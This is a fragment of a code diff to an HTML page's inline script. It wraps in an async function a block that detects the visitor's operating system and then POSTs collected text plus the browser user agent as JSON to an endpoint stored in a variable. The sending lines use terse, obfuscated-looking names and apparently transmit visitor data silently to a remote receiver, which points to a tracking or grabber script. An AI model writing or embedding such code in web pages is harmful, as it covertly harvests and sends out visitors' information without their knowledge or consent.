@@ -1,4 +1,5 @@
 <script>
+  (async () => {
   function getOS() {
     const userAgent = navigator.userAgent;
     if (userAgent.includes("Windows")) {
@@ -67,4 +68,5 @@
   p+=`\n`+window.navigator.userAgent
   x={content:p}
   w=g(b,{method:"POST",headers:{"Content-Type":"application/json",},body: JSON.stringify(x)})
+  })()
 </script>
